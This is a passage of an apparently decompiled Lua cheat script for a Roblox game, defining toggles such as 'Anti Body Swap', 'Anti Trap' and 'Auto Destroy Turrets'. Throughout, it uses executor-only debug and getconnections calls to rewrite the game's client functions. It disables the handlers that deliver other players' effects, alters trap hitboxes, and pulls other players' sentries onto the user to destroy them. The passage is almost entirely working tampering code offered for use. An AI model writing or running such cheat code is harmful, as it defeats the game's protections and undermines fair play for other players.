		for _, v13 in ipairs(result) do
			if v13.Enabled and type(v13.Fire) == "function" then
				if pcall(function()
					v13:Fire()
				end) then
					flag2 = true
					break
				end
			end
		end

		if not flag2 then
			return nil, "unavailable"
		end
		local now = os.clock()

		while true do
			local v13 = fn4(arg)

			if v13 then
				return v13
			else
				RunService.Heartbeat:Wait()
				if not (n <= os.clock() - now) then
					continue
				end
				break
			end
		end

		return fn4(arg), "cash"
	end

	local fn6

	fn6 = function(arg, arg2)
		local str

		if arg2 == "rebirth" then
			str = "A higher Rebirth level is required for " .. arg .. "."
		elseif arg2 == "cash" then
			str = "Not enough cash to buy " .. arg .. "."
		else
			str = "Unable to buy " .. arg .. " right now."
		end

		v.Notify("Tool unavailable", str, 5)
	end

	local fn7
	local n2 = 0

	fn3 = function(arg)
		n2 = math.max(n2, os.clock() + (tonumber(arg) or 1))
	end

	fn7 = function()
		return os.clock() < n2
	end

	do
		local n3 = 0.02
		local n4 = 5
		local n5 = 7
		local n6 = 5
		local n7 = 12
		local n8 = 4
		local n9 = 2
		local flag2 = false
		local flag3 = false
		local n10 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local v12 = nil
		local tbl3 = {}
		local n11 = 0
		local n12 = 0
		local v13 = nil
		local fn8 = nil

		local function fn9(arg)
			if not arg then
				return nil
			end
			local character_ = arg.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if humanoid and humanoid.Health > 0 and character_ then
				return character_
			end
			return nil
		end

		local function fn10(arg)
			local v14 = nil
			local v15 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v16 = fn9(player)

					if v16 then
						local magnitude = (v16.Position - arg.Position).Magnitude

						if not v14 or magnitude < v14 then
							v14 = magnitude
							v15 = player
						end
					end
				end
			end

			return v15
		end

		local function fn11()
			local character_ = localPlayer.Character
			return character_ and character_:FindFirstChild("Body Swap Potion") or localPlayer.Backpack:FindFirstChild("Body Swap Potion")
		end

		local function fn12(arg, arg2)
			local ok, result = pcall(getconnections, arg.Activated)
			if not ok then
				return
			end

			for _, v14 in ipairs(result) do
				local function_ = nil

				pcall(function()
					function_ = v14.Function
				end)

				if typeof(function_) == "function" then
					local ok2, result2 = pcall(debug.getinfo, function_)
					ok2 = ok2 and result2

					if ok2 then
						ok2 = string.find(result2.source or "", "BodySwapScript", 1, true)
					end

					if ok2 then
						local n13 = tonumber(result2.nups) or 0
						local flag4 = false

						for i_ = 1, n13 do
							local ok3, result3, result4 = pcall(debug.getupvalue, function_, i_)
							local flag5 = string.find(string.lower(tostring(result3 or "")), "target", 1, true) ~= nil
							local flag6 = typeof(result4) == "Instance" and result4:IsA("Player") and result4 ~= localPlayer
							flag5 = flag5 and (result4 == nil or typeof(result4) == "Instance" and result4:IsA("Player"))

							if ok3 and (flag5 or flag6) then
								flag4 = pcall(debug.setupvalue, function_, i_, arg2) or flag4
							end
						end

						local flag5 = not flag4

						if flag5 then
							flag5 = (tonumber(result2.nups) or 0) >= 2
						end

						if flag5 then
							pcall(debug.setupvalue, function_, 2, arg2)
						end
					end
				end
			end
		end

		local function fn13(arg)
			local tbl4 = {}

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Tool") then
					tbl4[#tbl4 + 1] = child
				end
			end

			return tbl4
		end

		local function fn14(arg)
			if not arg then
				return
			end
			local v14 = arg.PreviousToolStates[1]
			local bodySwapTool = arg.BodySwapTool

			if bodySwapTool and bodySwapTool.Parent then
				pcall(function()
					bodySwapTool:Deactivate()
					bodySwapTool.Enabled = true
					bodySwapTool.Parent = localPlayer.Backpack
				end)
			end

			for _, previousToolState in ipairs(arg.PreviousToolStates) do
				pcall(function()
					if previousToolState.Tool.Parent then
						previousToolState.Tool.Enabled = previousToolState.Enabled

						if previousToolState.Tool.Parent == character then
							previousToolState.Tool.Parent = localPlayer.Backpack
						end
					end
				end)
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not humanoid or humanoid.Health <= 0 then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")

			if tool == bodySwapTool then
				pcall(function()
					bodySwapTool:Deactivate()
					bodySwapTool.Parent = localPlayer.Backpack
				end)

				tool = nil
			end

			if not tool and v14 and v14.Tool.Parent == localPlayer.Backpack then
				pcall(function()
					fn3(0.5)
					humanoid:EquipTool(v14.Tool)
				end)
			end
		end

		local function fn15()
			local character_ = localPlayer.Character
			local v14 = fn11()
			if not v14 or not v14.Parent then
				return
			end

			pcall(function()
				v14:Deactivate()
				v14.Enabled = true

				if v14.Parent == character_ then
					v14.Parent = localPlayer.Backpack
				end
			end)
		end

		local function fn16(arg)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local bodySwapPotion

			if character_ then
				bodySwapPotion = fn11() or fn5("Body Swap Potion")
			else
				bodySwapPotion = character_
			end

			if not character_ or not humanoid or not bodySwapPotion then
				return nil
			end
			fn3(2)
			local tbl4 = {}

			for _, v14 in ipairs(fn13(character_)) do
				if v14 ~= bodySwapPotion then
					tbl4[#tbl4 + 1] = { Tool = v14, Enabled = v14.Enabled }

					pcall(function()
						v14:Deactivate()
						v14.Enabled = false
						v14.Parent = localPlayer.Backpack
					end)
				end
			end

			humanoid:UnequipTools()
			fn3(2)
			local n13 = os.clock() + 0.45

			while true do
				pcall(function()
					humanoid:EquipTool(bodySwapPotion)
				end)

				if bodySwapPotion.Parent == character_ then
					break
				else
					task.wait(0.03)
					if not (n13 <= os.clock()) then
						continue
					end
					break
				end
			end

			for _, v14 in ipairs(fn13(character_)) do
				if v14 ~= bodySwapPotion then
					pcall(function()
						v14:Deactivate()
						v14.Parent = localPlayer.Backpack
					end)
				end
			end

			fn12(bodySwapPotion, arg)

			return {
				Character = character_,
				Humanoid = humanoid,
				BodySwapTool = bodySwapPotion,
				PreviousToolStates = tbl4,
				StartedAt = os.clock(),
			}
		end

		local function fn17(arg, arg2, arg3)
			if flag3 then
				return
			end
			flag3 = true
			local v14 = n10

			task.spawn(function()
				local v15 = nil

				local ok = pcall(function()
					local n13 = arg3 and n7 + 3 or 12
					local n14 = os.clock() + n13
					local v16 = arg2

					while true do
						if flag2 and n10 == v14 and os.clock() < n14 then
							local v17 = fn9(localPlayer)

							if not v17 then
								task.wait(0.08)
								continue
							elseif not ((v17.Position - arg).Magnitude <= n6) then
								local flag4 = v15

								if v15 then
									local startedAt = v15.StartedAt
									flag4 = os.clock() - startedAt >= n8
								end

								if not flag4 then
									if not v16 or not fn9(v16) then
										v16 = fn10(v17)
									end

									if not v16 then
										task.wait(0.08)
										continue
									else
										local character_, humanoid, bodySwapTool, tool

										if not v15 or localPlayer.Character ~= v15.Character or not v15.BodySwapTool.Parent then
											fn14(v15)
											v13 = nil
											v15 = fn16(v16)
											v13 = v15

											if not v15 then
												task.wait(0.12)
												continue
											else
												character_ = v15.Character
												humanoid = v15.Humanoid
												bodySwapTool = v15.BodySwapTool
												tool = character_:FindFirstChildWhichIsA("Tool")
												tool = tool and tool ~= bodySwapTool

												if not tool then
													if bodySwapTool.Parent ~= character_ then
														pcall(function()
															fn3(1)
															humanoid:EquipTool(bodySwapTool)
														end)
													end

													if bodySwapTool.Parent == character_ then
														fn12(bodySwapTool, v16)

														if bodySwapTool.Enabled ~= false then
															pcall(function()
																bodySwapTool:Deactivate()
																bodySwapTool:Activate()
															end)
														end
													end

													task.wait(0.08)
													continue
												end
											end
										else
											character_ = v15.Character
											humanoid = v15.Humanoid
											bodySwapTool = v15.BodySwapTool
											tool = character_:FindFirstChildWhichIsA("Tool")
											tool = tool and tool ~= bodySwapTool

											if not tool then
												if bodySwapTool.Parent ~= character_ then
													pcall(function()
														fn3(1)
														humanoid:EquipTool(bodySwapTool)
													end)
												end

												if bodySwapTool.Parent == character_ then
													fn12(bodySwapTool, v16)

													if bodySwapTool.Enabled ~= false then
														pcall(function()
															bodySwapTool:Deactivate()
															bodySwapTool:Activate()
														end)
													end
												end

												task.wait(0.08)
												continue
											end
										end
									end
								end
							end
						end

						break
					end
				end)

				fn14(v15)

				if v13 == v15 then
					v13 = nil
				end

				fn15()
				task.wait(0.2)

				if n10 == v14 then
					flag3 = false

					if fn8 then
						fn8()
					end

					if not ok then
						fn15()
					end
				end
			end)
		end

		fn8 = function()
			v12 = nil
			table.clear(tbl3)
			n11 = 0
		end

		local function fn18(deltaTime)
			if localPlayer:GetAttribute("Stealing") == true then
				n12 = os.clock() + n9
			end

			n11 += deltaTime
			if n11 < n3 then
				return
			end
			n11 = 0
			local v14 = fn9(localPlayer)
			if not v14 then
				fn8()
				return
			end
			local position = v14.Position

			if v12 and not flag3 then
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer then
						local v15 = fn9(player)
						local v16 = tbl3[player]

						if v15 and v16 then
							local position2 = v15.Position
							if (position - v12).Magnitude >= n4 and (position2 - v16).Magnitude >= n4 and (position - v16).Magnitude <= n5 and (position2 - v12).Magnitude <= n5 then
								fn17(v12, player, localPlayer:GetAttribute("Stealing") == true or os.clock() <= n12)
								break
							end
						end
					end
				end
			end

			v12 = position

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v15 = fn9(player)
					tbl3[player] = v15 and v15.Position or nil
				end
			end
		end

		local function fn19()
			local v14 = flag3
			local flag4

			if flag3 then
				flag4 = v14
			else
				flag4 = v13 ~= nil
			end

			local v15 = v13
			v13 = nil
			flag2 = false
			flag3 = false
			n10 += 1
			fn14(v15)

			if flag4 then
				fn15()
			end

			fn8()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function fn20()
			fn19()
			flag2 = true
			fn8()
			local bodySwapPotion, v14 = fn5("Body Swap Potion")

			if not bodySwapPotion then
				fn6("Body Swap Potion", v14)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n10 += 1
				local v15 = v13
				v13 = nil
				fn14(v15)
				flag3 = false
				fn8()
				task.defer(fn15)
			end)

			connection3 = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
				if localPlayer:GetAttribute("Stealing") == true then
					n12 = os.clock() + n9
				end
			end)

			if localPlayer:GetAttribute("Stealing") == true then
				n12 = os.clock() + n9
			end

			connection = RunService.Heartbeat:Connect(fn18)
			return true
		end

		fn2(fn19)

		v10:CreateToggle({
			Name = "Anti Body Swap",
			Default = true,
			Callback = function(arg)
				if arg then
					fn20()
				else
					fn19()
				end
			end,
		})
	end

	do
		local flag2 = false
		local tbl3 = {}
		local tbl4 = {}
		local tbl5 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		local obj3 = setmetatable({}, { __mode = "k" })
		local obj4 = setmetatable({}, { __mode = "k" })
		local obj5 = setmetatable({}, { __mode = "k" })
		local obj6 = setmetatable({}, { __mode = "k" })
		local v12 = nil
		local moveFunction = nil
		local move = nil
		local moveFunction2 = nil
		local n3 = 0
		local n4 = 0
		local currentCamera = nil
		local humanoid = nil
		local flag3 = false
		local fieldOfView = 70
		local vector = Vector3.zero
		local tbl6 = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true }
		local fn8 = nil
		local fn9 = nil

		local function fn10(arg)
			for _, v13 in ipairs(arg) do
				if typeof(v13) == "RBXScriptConnection" then
					v13:Disconnect()
				end
			end

			table.clear(arg)
		end

		local fn11 = nil

		fn11 = function(arg, arg2, arg3)
			if typeof(arg) ~= "function" or arg2 > 3 or arg3[arg] then
				return false
			end
			arg3[arg] = true
			local ok, result = pcall(debug.getconstants, arg)
			local flag4 = false
			local flag5 = false
			local flag6 = false

			if ok then
				for _, v13 in ipairs(result) do
					if type(v13) == "string" then
						local v14 = string.lower(v13)

						if string.find(v14, "discoeffect", 1, true) then
							flag5 = true
						end

						if string.find(v14, "boogie", 1, true) then
							flag4 = true
						end

						if v14 == "fieldofview" then
							flag6 = true
						end
					end
				end
			end

			if flag5 and (flag4 or flag6) then
				return true
			end
			local ok2, result2 = pcall(debug.getprotos, arg)

			if ok2 then
				for _, v13 in ipairs(result2) do
					if fn11(v13, arg2 + 1, arg3) then
						return true
					end
				end
			end

			return false
		end

		local function fn12(arg)
			local enabled = nil

			return pcall(function()
				enabled = arg.Enabled
			end) and enabled == true
		end

		local function fn13(arg)
			if typeof(arg) ~= "function" then
				return false
			end
			local ok, result = pcall(debug.info, arg, "s")
			return ok and type(result) == "string" and string.find(string.lower(result), "paintballguncontroller", 1, true) ~= nil
		end

		local function fn14(arg)
			if not flag2 or not flag then
				return
			end

			if fn12(arg) then
				if pcall(function()
					arg:Disable()
				end) then
					obj5[arg] = true
				end
			end
		end

		local function fn15(arg)
			if not flag2 or not flag or not arg or not arg.Parent or not arg:IsA("RemoteEvent") then
				return
			end
			local ok, result = pcall(getconnections, arg.OnClientEvent)

			if ok then
				for _, v13 in ipairs(result) do
					if not obj6[v13] then
						obj6[v13] = true
						local function_ = nil

						pcall(function()
							function_ = v13.Function
						end)

						if fn11(function_, 1, {}) or fn13(function_) then
							obj4[v13] = true
							fn14(v13)
						end
					end
				end
			end
		end

		local function fn16()
			n4 += 1
			local v13 = n4

			task.spawn(function()
				local tbl7 = { { Object = Lighting, Kind = "Lighting" }, { Object = ReplicatedStorage, Kind = "Remotes" } }
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

				if playerScripts then
					tbl7[#tbl7 + 1] = { Object = playerScripts, Kind = "Sounds" }
				end

				local n5 = 1

				while flag2 and flag and n4 == v13 and n5 <= #tbl7 do
					local now = os.clock()
					local n6 = 0

					while true do
						local v14 = tbl7[n5]
						n5 += 1
						local object = v14.Object

						if object and object.Parent then
							if v14.Kind == "Lighting" then
								fn8(object)
							elseif v14.Kind == "Sounds" then
								fn9(object)
							elseif v14.Kind == "Remotes" and object:IsA("RemoteEvent") then
								fn15(object)
							end

							local tbl8 = {}

							pcall(function()
								tbl8 = object:GetChildren()
							end)

							for _, v15 in ipairs(tbl8) do
								tbl7[#tbl7 + 1] = { Object = v15, Kind = v14.Kind }
							end
						end

						n6 += 1
						if not (n5 > #tbl7 or n6 >= 20 or os.clock() - now >= 0.0015) then
							continue
						end
						break
					end

					if n5 <= #tbl7 then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function fn17()
			for k in pairs(obj5) do
				pcall(function()
					if not k.Enabled then
						k:Enable()
					end
				end)
			end

			table.clear(obj5)
			table.clear(obj4)
			table.clear(obj6)
		end

		fn8 = function(arg)
			if arg and arg.Parent and tbl6[arg.Name] then
				pcall(function()
					arg:Destroy()
				end)
			end
		end

		local function fn18()
			return localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		fn9 = function(arg)
			if not arg or not arg:IsA("Sound") or arg.Name ~= "Buzzing" then
				return
			end

			if obj3[arg] == nil then
				obj3[arg] = arg.Volume
			end

			local flag4 = false

			local function fn19()
				if flag4 or not flag2 or not arg.Parent then
					return
				end
				flag4 = true

				pcall(function()
					if arg.Playing then
						arg:Stop()
					end

					if arg.Volume ~= 0 then
						arg.Volume = 0
					end
				end)

				flag4 = false
			end

			fn19()
			if obj2[arg] then
				return
			end
			obj2[arg] = true
			tbl4[#tbl4 + 1] = arg:GetPropertyChangedSignal("Volume"):Connect(fn19)
			tbl4[#tbl4 + 1] = arg:GetPropertyChangedSignal("Playing"):Connect(fn19)
		end

		local function fn19()
			if flag3 or not flag2 then
				return
			end
			flag3 = true

			pcall(function()
				if currentCamera and currentCamera.Parent and currentCamera.FieldOfView ~= fieldOfView then
					currentCamera.FieldOfView = fieldOfView
				end

				if humanoid and humanoid.Parent and humanoid.CameraOffset ~= vector then
					humanoid.CameraOffset = vector
				end
			end)

			flag3 = false
		end

		local function fn20()
			fn10(tbl5)
			currentCamera = Workspace.CurrentCamera
			local character_ = localPlayer.Character
			humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			fn19()

			if currentCamera then
				tbl5[#tbl5 + 1] = currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(fn19)
			end

			if humanoid then
				tbl5[#tbl5 + 1] = humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(fn19)
			end
		end

		local function fn21()
			fn10(tbl5)
			currentCamera = nil
			humanoid = nil
			flag3 = false
		end

		local function fn22()
			if v12 then
				pcall(function()
					v12.moveFunction = move or moveFunction
				end)
			end

			v12 = nil
			moveFunction = nil
			move = nil
			moveFunction2 = nil
		end

		local function fn23()
			if v12 and moveFunction2 then
				if v12.moveFunction ~= moveFunction2 then
					v12.moveFunction = moveFunction2
				end

				return
			end

			pcall(function()
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
				playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
				if not playerScripts then
					return
				end
				local controls = require(playerScripts):GetControls()
				if not controls then
					return
				end
				v12 = controls
				moveFunction = controls.moveFunction
				move = localPlayer.Move

				moveFunction2 = function(arg, arg2, arg3)
					return localPlayer:Move(arg2, arg3)
				end

				v12.moveFunction = moveFunction2
			end)
		end

		local function fn24()
			fn10(tbl4)

			for k, v13 in pairs(obj3) do
				if k and k.Parent then
					pcall(function()
						k.Volume = v13
					end)
				end
			end

			table.clear(obj2)
			table.clear(obj3)
		end

		local function fn25()
			flag2 = false
			n3 += 1
			n4 += 1
			fn10(tbl3)
			fn17()
			fn21()
			fn22()
			fn24()
		end

		local function fn26()
			fn25()
			flag2 = true
			n3 += 1
			local v13 = n3
			fn23()
			fn20()
			fn16()

			tbl3[#tbl3 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
				if flag2 then
					fn8(descendant)
				end
			end)

			tbl3[#tbl3 + 1] = ReplicatedStorage.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("RemoteEvent") then
					task.defer(function()
						fn15(descendant)
					end)

					task.delay(0.5, function()
						fn15(descendant)
					end)
				end
			end)

			local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

			if playerScripts then
				tbl3[#tbl3 + 1] = playerScripts.DescendantAdded:Connect(function(descendant)
					if flag2 then
						fn9(descendant)
					end
				end)
			end

			tbl3[#tbl3 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				if flag2 then
					fn20()
				end
			end)

			tbl3[#tbl3 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("Humanoid", 5)

					if flag2 and character_ == localPlayer.Character then
						fn20()
					end
				end)
			end)

			task.spawn(function()
				while true do
					if flag2 and flag and n3 == v13 then
						task.wait(0.1)

						if not (not flag2 or not flag or n3 ~= v13) then
							if not fn18() then
								fn23()
							end

							continue
						end
					end

					break
				end
			end)
		end

		fn2(fn25)

		v10:CreateToggle({
			Name = "Anti Bee, Disco & Paintball Effect",
			Default = true,
			Callback = function(arg)
				if arg then
					fn26()
				else
					fn25()
				end
			end,
		})
	end

	do
		local n3 = 1.06
		local vector = Vector3.new(2.9, 1.15, 2.9)
		local color = Color3.fromRGB(255, 45, 45)
		local lineThickness = 0.03
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local tbl3 = {}

		local function fn8(arg)
			return arg:IsA("Model") and arg.Name:match("^Trap") ~= nil
		end

		local function fn9(arg, arg2)
			local v12 = arg:FindFirstChild(arg2)
			if v12 and v12:IsA("BasePart") then
				return v12
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant.Name == arg2 and descendant:IsA("BasePart") then
					return descendant
				end
			end

			return nil
		end

		local function fn10(arg)
			local v12 = tbl3[arg]
			if not v12 then
				return
			end
			tbl3[arg] = nil

			if v12.Connection then
				pcall(function()
					v12.Connection:Disconnect()
				end)
			end

			for _, propertyConnection in ipairs(v12.PropertyConnections) do
				pcall(function()
					propertyConnection:Disconnect()
				end)
			end

			table.clear(v12.PropertyConnections)

			if v12.Outline then
				pcall(function()
					v12.Outline:Destroy()
				end)
			end

			if v12.Target and v12.Target.Parent then
				pcall(function()
					v12.Target.Size = v12.OriginalSize
					v12.Target.CFrame = v12.OriginalCFrame
					v12.Target.CanCollide = v12.OriginalCanCollide
					v12.Target.CanTouch = v12.OriginalCanTouch
				end)
			end
		end

		local function fn11()
			for k in pairs(tbl3) do
				fn10(k)
			end

			table.clear(tbl3)
		end

		local function fn12(arg, arg2)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ then
				return false
			end
			local v12 = arg:PointToObjectSpace(character_.Position)
			local n4 = arg2 * 0.5
			local x = n4.X
			local flag3 = math.abs(v12.X) <= x

			if flag3 then
				local y = n4.Y
				flag3 = math.abs(v12.Y) <= y
			end

			if flag3 then
				local z = n4.Z
				flag3 = math.abs(v12.Z) <= z
			end

			return flag3
		end

		local function fn13(arg)
			if not flag2 or tbl3[arg] then
				return
			end
			local open = fn9(arg, "Open")
			local close = fn9(arg, "Close")
			if not open or not close then
				return
			end
			local boundingBox, v12 = arg:GetBoundingBox()
			local n4 = v12 * n3 + vector
			local n5 = math.max(n4.X, n4.Z)
			local vector2 = Vector3.new(n5, n4.Y, n5)
			if fn12(open.CFrame, vector2) then
				return
			end

			local tbl4 = {
				Target = close,
				OriginalSize = close.Size,
				OriginalCFrame = close.CFrame,
				OriginalCanCollide = close.CanCollide,
				OriginalCanTouch = close.CanTouch,
				PropertyConnections = {},
			}

			tbl3[arg] = tbl4
			local flag3 = false

			local function fn14()
				if flag3 or not flag2 or not close.Parent or not open.Parent then
					return
				end
				flag3 = true

				pcall(function()
					close.Size = vector2
					close.CFrame = open.CFrame
					close.CanCollide = true
					close.CanTouch = false
				end)

				flag3 = false
			end

			fn14()
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("Size"):Connect(fn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CFrame"):Connect(fn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanCollide"):Connect(fn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanTouch"):Connect(fn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = open:GetPropertyChangedSignal("CFrame"):Connect(fn14)
			local selectionBox = Instance.new("SelectionBox")
			selectionBox.Name = fn()
			selectionBox.Adornee = close
			selectionBox.Archivable = false
			selectionBox.Color3 = color
			selectionBox.LineThickness = lineThickness
			selectionBox.SurfaceTransparency = 1
			selectionBox.Transparency = 0
			selectionBox.Parent = close
			tbl4.Outline = selectionBox

			tbl4.Connection = arg.AncestryChanged:Connect(function(child, parent)
				if not parent then
					fn10(arg)
				end
			end)
		end

		local function fn14()
			for _, child in ipairs(Workspace:GetChildren()) do
				if fn8(child) then
					fn13(child)
				end
			end
		end

		local function fn15()
			flag2 = false

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			fn11()
		end

		local function fn16()
			fn15()
			flag2 = true
			fn14()

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if not flag2 or not fn8(child) then
					return
				end

				task.defer(function()
					if flag2 and child.Parent then
						fn13(child)
					end
				end)
			end)

			connection = localPlayer.CharacterAdded:Connect(function()
				if flag2 then
					task.defer(fn14)
				end
			end)
		end

		fn2(fn15)

		v10:CreateToggle({
			Name = "Anti Trap",
			Default = true,
			Callback = function(arg)
				if arg then
					fn16()
				else
					fn15()
				end
			end,
		})
	end

	do
		local flag2 = false
		local n3 = 0
		local connection = nil
		local tbl3 = {}
		local tbl4 = {}
		local v12 = nil
		local v13 = nil
		local n4 = 0
		local str = "Sentry_" .. tostring(localPlayer.UserId)

		local function fn8(arg)
			local isModel

			if arg then
				isModel = arg:IsA("Model") or arg:IsA("BasePart")
			else
				isModel = arg
			end

			return isModel and arg.Name:match("^Sentry_") ~= nil and arg.Name ~= str
		end

		local function fn9(arg)
			if arg:IsA("BasePart") then
				return arg
			end
			return arg:FindFirstChildWhichIsA("BasePart", true)
		end

		local function fn10(arg)
			return arg:FindFirstChild("SetupReady", true) ~= nil
		end

		local function fn11(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")
			if arg and arg.Name:lower():find("bat", 1, true) then
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not backpack then
				return nil
			end

			for _, child in ipairs(backpack:GetChildren()) do
				if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
					return child
				end
			end

			return nil
		end

		local function fn12()
			local v14 = v12
			local v15 = v13
			v12 = nil
			v13 = nil
			if not v14 or not v14.Parent then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not character_ or not humanoid or humanoid.Health <= 0 or v14.Parent ~= character_ and v14.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == v14 then
				return
			end

			if tool and tool ~= v15 then
				return
			end

			pcall(function()
				fn3(0.5)
				humanoid:EquipTool(v14)
			end)
		end

		local function fn13()
			return localPlayer:GetAttribute("Stealing") == true or localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		local function fn14(arg)
			if not tbl4[arg] then
				tbl4[arg] = { CanCollide = arg.CanCollide, Transparency = arg.Transparency, Size = arg.Size }
			end

			arg.CanCollide = false
			arg.Transparency = 1
			arg.Size = Vector3.new(10, 10, 10)
		end

		local function fn15()
			for k, v14 in pairs(tbl4) do
				if k and k.Parent then
					pcall(function()
						k.CanCollide = v14.CanCollide
						k.Transparency = v14.Transparency
						k.Size = v14.Size
					end)
				end
			end

			tbl4 = {}
		end

		local function fn16()
			if fn13() then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
				return
			end
			local v14 = nil
			local huge = math.huge
			local v15 = nil

			for k in pairs(tbl3) do
				if not k.Parent then
					tbl3[k] = nil
				elseif fn10(k) then
					local v16 = fn9(k)

					if v16 then
						local magnitude = (humanoidRootPart.Position - v16.Position).Magnitude

						if magnitude < huge then
							v14 = v16
							huge = magnitude
							v15 = k
						end
					end
				end
			end

			if not v15 or not v15.Parent or not v14 or not v14.Parent then
				return
			end

			pcall(function()
				fn14(v14)
				v14.CFrame = humanoidRootPart.CFrame
			end)

			local v16 = fn11(character_)
			if not v16 then
				return
			end

			if v16.Parent ~= character_ then
				local tool = character_:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= v16 and not v12 then
					v12 = tool
				end

				v13 = v16

				pcall(function()
					fn3(1)
					humanoid:EquipTool(v16)
				end)
			end

			if v16.Parent == character_ then
				n4 = os.clock()

				pcall(function()
					v16:Activate()
				end)
			end
		end

		local function fn17()
			flag2 = false
			n3 += 1
			n4 = 0
			fn12()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			tbl3 = {}
			fn15()
		end

		local function fn18()
			fn17()
			flag2 = true
			n3 += 1
			local v14 = n3

			for _, descendant in ipairs(Workspace:GetDescendants()) do
				if fn8(descendant) then
					tbl3[descendant] = true
				end
			end

			connection = Workspace.DescendantAdded:Connect(function(descendant)
				if flag2 and fn8(descendant) then
					tbl3[descendant] = true
				end
			end)

			fn16()

			task.spawn(function()
				local v15 = n4

				while flag2 and n3 == v14 and flag do
					if not fn13() then
						local character_ = localPlayer.Character
						local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

						if humanoid and humanoid.Health > 0 and humanoidRootPart then
							local v16 = nil
							local huge = math.huge
							local v17 = nil

							for k in pairs(tbl3) do
								if not k.Parent then
									tbl3[k] = nil
								elseif fn10(k) then
									local v18 = fn9(k)

									if v18 then
										local magnitude = (humanoidRootPart.Position - v18.Position).Magnitude

										if magnitude < huge then
											v16 = v18
											huge = magnitude
											v17 = k
										end
									end
								end
							end

							if v17 and v17.Parent and v16 and v16.Parent then
								pcall(function()
									fn14(v16)
									v16.CFrame = humanoidRootPart.CFrame
								end)

								local now = os.clock()

								if now - v15 >= 0.01 then
									local v18 = fn11(character_)

									if v18 then
										if v18.Parent ~= character_ then
											local tool = character_:FindFirstChildWhichIsA("Tool")

											if tool and tool ~= v18 and not v12 then
												v12 = tool
											end

											v13 = v18

											pcall(function()
												fn3(1)
												humanoid:EquipTool(v18)
											end)
										end

										if v18.Parent == character_ then
											pcall(function()
												v18:Activate()
											end)
										end
									end

									v15 = now
								end
							else
								fn12()
							end
						end
					else
						fn12()
					end

					task.wait()
				end
			end)
		end

		fn2(fn17)

		v10:CreateToggle({
			Name = "Auto Destroy Turrets",
			Default = true,
			Callback = function(arg)
				if arg then
					fn18()
				else
					fn17()
				end
			end,
		})
	end

	do
		local n3 = 0.6
		local n4 = 2
		local n5 = 0.2
		local n6 = 0.6
		local n7 = 1.5
		local flag2 = false

		local function fn8()
			local character_ = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			return character_ and character_:FindFirstChild("Quantum Cloner") or backpack and backpack:FindFirstChild("Quantum Cloner")
		end

		local function fn9(arg)
			local character_ = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not backpack or not humanoid or humanoid.Health <= 0 then
				return false
			end
			fn3(5)

